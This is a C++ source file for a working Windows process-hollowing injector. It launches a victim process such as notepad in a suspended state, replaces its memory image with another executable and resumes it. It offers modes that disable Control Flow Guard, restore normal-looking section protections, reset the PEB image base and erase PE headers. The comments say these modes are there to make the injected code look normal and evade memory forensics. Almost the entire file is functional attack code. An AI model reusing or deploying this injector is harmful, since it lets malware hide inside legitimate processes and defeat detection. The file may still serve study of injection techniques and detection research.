// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

//#define ENABLE_PAUSE

// ######## for SetProcessValidCallTargets
// Taken from https://github.com/BreakingMalwareResearch/CFGExceptions
#include <Memoryapi.h>
#define KERNELBASE ("kernelbase.dll")
#define SETPROCESSVALIDCALLTARGETS ("SetProcessValidCallTargets")
#define CFG_CALL_TARGET_VALID (0x00000001)

typedef struct _CFG_CALL_TARGET_INFO
{
	ULONG_PTR	Offset;
	ULONG_PTR	Flags;
} CFG_CALL_TARGET_INFO, *PCFG_CALL_TARGET_INFO;

typedef BOOL(WINAPI *_SetProcessValidCallTargets)(
	HANDLE					hProcess,
	PVOID					VirtualAddress,
	SIZE_T					RegionSize,
	ULONG					NumberOfOffsets,
	PCFG_CALL_TARGET_INFO	OffsetInformation
	);

int GetFunctionAddressFromDll(
	PSTR pszDllName,
	PSTR pszFunctionName,
	PVOID *ppvFunctionAddress
	)
{
	HMODULE hModule = NULL;
	PVOID   pvFunctionAddress = NULL;
	int eReturn = -1;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		printf("GetModuleHandleA failed for GetFunctionAddressFromDll.\n");
		eReturn = -10;
		goto lblCleanup;
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		printf("GetProcAddress failed for GetFunctionAddressFromDll.\n");
		eReturn = -20;
		goto lblCleanup;
	}
	*ppvFunctionAddress = pvFunctionAddress;
	eReturn = 0;

lblCleanup:
	return eReturn;

}

// #########################

void sysError(){

	WCHAR sysMsg[256] = { NULL };

	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		sysMsg,
		256,
		NULL);

	wprintf(L"  FAILED WITH ERROR CODE: %ls\n", sysMsg);
}

BOOL SetPrivDebug(){
	DWORD procPID = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LUID luid;
	TOKEN_PRIVILEGES tp;

	procPID = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, procPID);
	if (hProcess == NULL){
		printf("\n  WARNING: OpenProcess() ERROR!\n");
		sysError();
		CloseHandle(hProcess);
		return false;
	}

	if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)){
		printf("\n  WARNING: OpenProcessToken() ERROR!\n");
		sysError();
		CloseHandle(hToken);
		return false;
	}
	if (!LookupPrivilegeValue(NULL, TEXT("SeDebugPrivilege"), &luid)){
		printf("\n  WARNING: LookupPrivilegeValue() ERROR!\n");
		sysError();
		return false;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)){
		printf("\n  WARNING: AdjustTokenPrivileges() ERROR!");
		sysError();
		return false;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){
		printf("The token does not have the specified privilege. \n");
		return false;
	}
	return true;
}


int DisableCfg(LPPROCESS_INFORMATION pProcessInfo, DWORD victim_size, PVOID victim_base_addr, DWORD cfg_size, PVOID cfg_base){
	printf("Starting DisableCfg for base %p and cfg base %p\n", victim_base_addr, cfg_base);
	//SetProcessValidCallTargets
	_SetProcessValidCallTargets	pfnSetProcessValidCallTargets = NULL;
	int ret_val = 0;
	// Get the address of KernelBase!SetProcessValidCallTargets
	GetFunctionAddressFromDll(
		KERNELBASE,
		SETPROCESSVALIDCALLTARGETS,
		(PVOID *)&pfnSetProcessValidCallTargets
		);
	if (pfnSetProcessValidCallTargets == NULL){
		printf("\nRetrieving SetProcessValidCallTargets failed...\n");
		sysError();
		return -1;
	}
	else {
		// Depending on https://docs.microsoft.com/en-us/windows/win32/memory/-cfg-call-target-info#members
		// the CFG_CALL_TARGET_INFO.Offset "should be 16 byte aligned".
		for (unsigned long long i = 0; (i + 15) < cfg_size; i += 16){
			//printf("%d", i);
			//printf("Address of SetProcessValidCallTargets: %p\n", pfnSetProcessValidCallTargets);
			CFG_CALL_TARGET_INFO tCfgCallTargetInfo = { 0 };
			tCfgCallTargetInfo.Flags = CFG_CALL_TARGET_VALID;
			//tCfgCallTargetInfo.Offset = (ULONG_PTR)newBaseAddress - (ULONG_PTR)newBaseAddress;
			tCfgCallTargetInfo.Offset = (ULONG_PTR)cfg_base - (ULONG_PTR)victim_base_addr + (ULONG_PTR)i;

			if (!pfnSetProcessValidCallTargets(
				pProcessInfo->hProcess,
				victim_base_addr,
				(size_t)victim_size,
				(ULONG)1,
				&tCfgCallTargetInfo
				))
			{
				printf("offset 0x%llx for module base %p and cfg base 0x%p failed.\n", i, victim_base_addr, cfg_base);
				sysError();
				ret_val = -1;
			}
		}
	}
	return ret_val;
}

// Returns the page protection equivalent (usable by VirtualProtect) for the given characteristics value of a PE Section
DWORD map_sec_prot_to_page_prot(DWORD sec_characteristics){
	DWORD sec_prot = (sec_characteristics & IMAGE_SCN_MEM_EXECUTE) | (sec_characteristics & IMAGE_SCN_MEM_READ) | (sec_characteristics & IMAGE_SCN_MEM_WRITE);
	DWORD page_prot;

	switch (sec_prot)
	{
		case IMAGE_SCN_MEM_EXECUTE:
			page_prot = PAGE_EXECUTE;
			break;
		case IMAGE_SCN_MEM_READ:
			page_prot = PAGE_READONLY;
			break;
		case (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE):
			page_prot = PAGE_READWRITE;
			break;
		case (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE) :
			page_prot = PAGE_EXECUTE_READ;
			break;
		case (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE) :
			page_prot = PAGE_EXECUTE_READWRITE;
			break;
		default:
			page_prot = PAGE_READONLY;
	}

	return page_prot;
}

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile, char* mode)
{

	if (!SetPrivDebug())
		printf("Enabling debug priv didn't work, probably we are not running with "
		"appropriate rights. In most cases this shouldn't be a problem, so we simply "
		"proceed.\n\n");

	char * s = mode;
	while (*s) {
		*s = tolower((unsigned char) *s);
		s++;
	}

#ifdef ENABLE_PAUSE
	printf("Press Enter when ready to create the victim process.\n");
	system("pause");
#endif
	printf("[*] Creating victim process...\r\n");
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	CreateProcessA
		(
		0,
		pDestCmdLine,
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		pStartupInfo,
		pProcessInfo
		);

	if (!pProcessInfo->hProcess)
	{
		printf("Error creating process\r\n");

		return;
	}
	DWORD peb_address = FindRemotePEB(pProcessInfo->hProcess);
	size_t image_base_offset = offsetof(PEB, ImageBaseAddress);
	printf("Address of PEB->ImageBaseAddress field in victim process: %x\n", peb_address + image_base_offset);

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	PLOADED_IMAGE victim_image = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

	printf("Opening malicious image\r\n");

	HANDLE hFile = CreateFileA
		(
		pSourceFile,
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
		);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}

	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
	DWORD victim_size = victim_image->FileHeader->OptionalHeader.SizeOfImage;
	DWORD inject_size = pSourceHeaders->OptionalHeader.SizeOfImage;

	printf("Inject size: %x   Victim Size: %x\n", inject_size, victim_size);

	PVOID origBaseAddress = pPEB->ImageBaseAddress;
	PVOID newBaseAddress = pPEB->ImageBaseAddress;
	printf("ImageBaseAddress in target process: %x\n", origBaseAddress);

	if (strstr(mode, "normal")){

#ifdef ENABLE_PAUSE
		printf("Press Enter to continue with unmapping.\r\n");
		system("pause");
#endif
		printf("[*] Unmapping destination section\r\n");

		HMODULE hNTDLL = GetModuleHandleA("ntdll");

		FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

		_NtUnmapViewOfSection NtUnmapViewOfSection =
			(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

		DWORD dwResult = NtUnmapViewOfSection
			(
			pProcessInfo->hProcess,
			newBaseAddress
			);

		if (dwResult)
		{
			printf("Error unmapping section\r\n");
			return;
		}
		else
			printf("Section unmapped successfully.\r\n");
	}


	else if (strstr(mode, "overwrite")){
		printf("[*] Starting to overwrite victim executable...\r\n");
		printf("First, we are setting the protection of the victim to RWX.\r\n");
		DWORD oldProtection;
		VirtualProtectEx
			(
			pProcessInfo->hProcess,
			newBaseAddress,
			victim_size,
			PAGE_EXECUTE_READWRITE,
			&oldProtection
			);

#ifdef ENABLE_PAUSE
		printf("Press enter when ready to clear the victim executable.\n");
		system("pause");
#endif
		printf("First, we overwrite the whole victim memory with null bytes.\n");
		// Clearing space for the new executable
		char* nullbytes = (char*)malloc(victim_size);
		memset(nullbytes, 0, victim_size);
		WriteProcessMemory(
			pProcessInfo->hProcess,
			newBaseAddress,
			nullbytes,
			victim_size,
			0
			);
		printf("Victim executable cleared with null bytes.\n");
	}

	if (strstr(mode, "normal") || strstr(mode, "nounmap")){
#ifdef ENABLE_PAUSE
		printf("Press enter when ready to create new memory area for the executable.\n");
		system("pause");
#endif
		DWORD pageProtection = PAGE_EXECUTE_READWRITE;

		if (strstr(mode, "nx"))
			pageProtection = PAGE_READONLY;

		if (strstr(mode, "nounmap")){
			printf("[*] Now creating a new memory area for our new PE file.\n");
			newBaseAddress = NULL;
		}

		PVOID pRemoteImage = VirtualAllocEx
			(
			pProcessInfo->hProcess,
			newBaseAddress,
			inject_size,
			MEM_COMMIT | MEM_RESERVE,
			pageProtection
			);

		if (!pRemoteImage)
		{
			printf("VirtualAllocEx call failed\r\n");
			sysError();
			return;
		}

		if (strstr(mode, "nounmap"))
			newBaseAddress = pRemoteImage;

		printf("Allocated memory at %p\r\n", pRemoteImage);

		if (strstr(mode, "nx")){
			DWORD oldProtection;
			VirtualProtectEx
				(
				pProcessInfo->hProcess,
				newBaseAddress,
				inject_size,
				PAGE_EXECUTE_READWRITE,
				&oldProtection
				);
		}
	}

	DWORD dwDelta = (DWORD)newBaseAddress -
		pSourceHeaders->OptionalHeader.ImageBase;

	printf(
		"Old image location: 0x%p\r\n"
		"New image location: 0x%p\r\n",
		pPEB->ImageBaseAddress,
		newBaseAddress
		);

	printf(
		"Source image base: 0x%p\r\n"
		"Destination image base: 0x%p\r\n",
		pSourceHeaders->OptionalHeader.ImageBase,
		newBaseAddress
		);

	printf("Relocation delta: 0x%p\r\n", dwDelta);

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)newBaseAddress;

#ifdef ENABLE_PAUSE
	printf("Press enter when ready to write the new executable.\n");
	system("pause");
#endif

	printf("[*] Starting to write new executable...\r\n");
	printf("Writing headers\r\n");

	if (!WriteProcessMemory
		(
		pProcessInfo->hProcess,
		newBaseAddress,
		pBuffer,
		pSourceHeaders->OptionalHeader.SizeOfHeaders,
		0
		))
	{
		printf("Error writing PE header\r\n");

		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination =
			(PVOID)((DWORD)newBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

		if (!WriteProcessMemory
			(
			pProcessInfo->hProcess,
			pSectionDestination,
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
			))
		{
			printf("Error writing process memory\r\n");
			return;
		}

		if (strstr(mode, "disablecfg")){
			if (pSourceImage->Sections[x].Characteristics & IMAGE_SCN_MEM_EXECUTE){
				printf("[*] Disabling CFG for section %s.\n", pSourceImage->Sections[x].Name);
				DisableCfg(pProcessInfo, victim_size, newBaseAddress, pSourceImage->Sections[x].SizeOfRawData, pSectionDestination);
			}
		}
	}

	if (dwDelta){
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("[*] Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData =
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader =
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks =
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory
						(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)newBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
						);

					dwBuffer += dwDelta;

					if (!WriteProcessMemory(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)newBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
						))
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}

			break;
		}
	}

	DWORD dwBreakpoint = 0xCC;

	printf("Calculating new entrypoint: %x + %x\r\n", newBaseAddress, pSourceHeaders->OptionalHeader.AddressOfEntryPoint);
	DWORD dwEntrypoint = (DWORD)newBaseAddress +
		pSourceHeaders->OptionalHeader.AddressOfEntryPoint;


#ifdef WRITE_BP
	printf("Writing breakpoint\r\n");

	if (!WriteProcessMemory
		(
		pProcessInfo->hProcess,
		(PVOID)dwEntrypoint,
		&dwBreakpoint,
		4,
		0
		))
	{
		printf("Error writing breakpoint\r\n");
		return;
	}
#endif

	if (strstr(mode, "overwrite"))
		FlushInstructionCache(
		pProcessInfo->hProcess,
		newBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfHeaders);

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;

	printf("Getting thread context\r\n");

	if (!GetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error getting context\r\n");
		return;
	}

	pContext->Eax = dwEntrypoint;
	printf("Thread context - EBX: %x\n", pContext->Ebx);

	printf("Setting thread context\r\n");

	if (!SetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error setting context\r\n");
		return;
	}
	printf("Entrypoint: %x\r\n", dwEntrypoint);
	DWORD tempBuffer = 0;

	printf("Entrypoint of new image in source: %x\r\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
	PLOADED_IMAGE newImage = ReadRemoteImage(pProcessInfo->hProcess, newBaseAddress);
	printf("Entrypoint of new image in destination: %x\r\n", newImage->FileHeader->OptionalHeader.AddressOfEntryPoint);

	printf("Orig PEB Imagebase: %x\n", pPEB->ImageBaseAddress);
	// Necessary for the no-unmap cases
	SetRemoteImageBase(pProcessInfo->hProcess, (DWORD)newBaseAddress);
	pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	printf("New PEB Imagebase: %x\n", pPEB->ImageBaseAddress);



	printf("[*] Everything ready");
#ifdef ENABLE_PAUSE
	printf(", press enter to resume thread\r\n");
	system("pause");
#else
	printf(".\r\n");
#endif


	if (strstr(mode, "setsecprot")){
#ifdef ENABLE_PAUSE
		printf("Press enter when ready to set the section protections.\n");
		system("pause");
#endif
		// We are now setting the correct PE section protections
		// This makes most sense in the 'overwrite' mode, to let the mapped executable appear "normal"
		printf("[*] Starting to set the Section protections...\n");
		DWORD oldProtect = 0;

		printf("First, we set everything to read only: At the one hand for "
			"the zero'ed memory after our newly injected executable, at the other "
			"for the PE header.\n");
		DWORD protect_size = inject_size;
		if (strstr(mode, "overwrite"))
			protect_size = victim_size;

		if (!VirtualProtectEx(
			pProcessInfo->hProcess,
			newBaseAddress,
			protect_size,
			//pSourceHeaders->OptionalHeader.SizeOfHeaders,
			PAGE_READWRITE,
			&oldProtect))
		{
			printf("Error while setting ReadWrite\r\n");
			sysError();
		}


		// Now setting each section
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{

			if (!pSourceImage->Sections[x].PointerToRawData)
				continue;

			PVOID pSectionDestination =
				(PVOID)((DWORD)newBaseAddress + pSourceImage->Sections[x].VirtualAddress);

			DWORD new_protection = map_sec_prot_to_page_prot(pSourceImage->Sections[x].Characteristics);
			DWORD section_size = pSourceImage->Sections[x].SizeOfRawData;
			printf("Now setting the protection of section %s at %p with size 0x%x to 0x%x\r\n", pSourceImage->Sections[x].Name, pSectionDestination, section_size, new_protection);

			if (!VirtualProtectEx
				(
				pProcessInfo->hProcess,
				pSectionDestination,
				section_size,
				new_protection,
				&oldProtect
				))
			{
				printf("Setting the protection for section %s failed.\r\n", pSourceImage->Sections[x].Name);
				sysError();
			}
		}

		if (VirtualProtectEx(
			pProcessInfo->hProcess,
			newBaseAddress,
			0x1000,
			PAGE_READONLY,
			&oldProtect))
		{
			printf("Successfully set the header to ReadOnly.\r\n");
		}
		else{
			printf("Settting the header to ReadOnly failed.\r\n");
			sysError();
		}
	}

	printf("[*] Resuming thread...\r\n");

	if (!ResumeThread(pProcessInfo->hThread))
	{
		printf("Error resuming thread\r\n");
		return;
	}

	if (strstr(mode, "resetbase") || strstr(mode, "clear")){
		Sleep(1000);
		// If we clear the header or even just the MZ bytes before the process is fully
		// set up (this can e.g., happen for Windows Desktop applications or in the context
		// of not yet loaded DLLs), the new process might not be able to work correctly.
		// This can be reproduced with a sleep of 2 seconds in the malicious executable before
		// any API calls are made (so it waits after the overwrite). We observed some weird
		// spawning of new victim processes in these cases, that die right afterwards.
		// For reproducing purposes, the code allows to clear without rebase.
		if (strstr(mode, "resetbase")){
#ifdef ENABLE_PAUSE
			printf("Press enter when ready to reset PEB base address.\n");
			system("pause");
#endif
			printf("[*] Now resetting PEB ImageBaseAddress...\n");

			pPEB = ReadRemotePEB(pProcessInfo->hProcess);
			printf("Currently set PEB Imagebase: %x\n", pPEB->ImageBaseAddress);
			DWORD new_base = (DWORD)origBaseAddress;
			if (strstr(mode, "resetbasentdll")){
				new_base = (DWORD)GetModuleHandle(L"ntdll");
			}
			SetRemoteImageBase(pProcessInfo->hProcess, new_base);
			pPEB = ReadRemotePEB(pProcessInfo->hProcess);
			printf("Final PEB Imagebase: %x\n", pPEB->ImageBaseAddress);
			printf("Reset done.\r\n");
		}
		else{
			printf("WARNING: clearing the header without resetting the base might have bad side effects. "
				"It is advised to also use 'resetBase'.\r\n");
		}
		if (strstr(mode, "clear")){
#ifdef ENABLE_PAUSE
			printf("Press enter when ready to clear the header bytes.\n");
			system("pause");
#endif
			DWORD oldProtect = 0;
			if (strstr(mode, "setsecprot"))
			{
				VirtualProtectEx(
					pProcessInfo->hProcess,
					newBaseAddress,
					0x1000,
					PAGE_READWRITE,
					&oldProtect);
			}
			DWORD clear_count = 0;
			if (strstr(mode, "clearmz")){
				clear_count = 2;
				printf("[*] Now clearing MZ magic bytes.\n");
			}
			else{
				// In this case, we clear the whole header (clearHeader)
				clear_count = pSourceHeaders->OptionalHeader.SizeOfHeaders;
				printf("[*] Now clearing all headers, which have a total size of 0x%x.\n", clear_count);
			}

			char* nullbytes = (char*)malloc(clear_count);
			memset(nullbytes, 0, clear_count);
			WriteProcessMemory(pProcessInfo->hProcess, newBaseAddress, nullbytes, clear_count, 0);
			if (strstr(mode, "setsecprot"))
			{
				VirtualProtectEx(
					pProcessInfo->hProcess,
					newBaseAddress,
					0x1000,
					PAGE_READONLY,
					&oldProtect);
			}
			printf("Clearing done.\n");
		}
	}

	printf("[*] Process hollowing complete\r\n");

}

int main(int argc, char* argv[])
{
	char* pPath = "helloworld.exe";
	char* victim_process = "notepad";
	char* mode = "normal";

	if (argc > 1)
		victim_process = argv[1];
	if (argc > 2)
		pPath = argv[2];
	if (argc > 3)
		mode = argv[3];
	// Example Usage: 
	// ProcessHollowing.exe
	// ProcessHollowing.exe c:\Windows\SysWOW64\notepad.exe HelloWorld.exe overwrite_disableCFG_setSecProt

	CreateHollowedProcess(victim_process, pPath, mode);

#ifdef ENABLE_PAUSE
	printf("All done, press enter to exit.\n");
	system("pause");
#endif

	return 0;
}
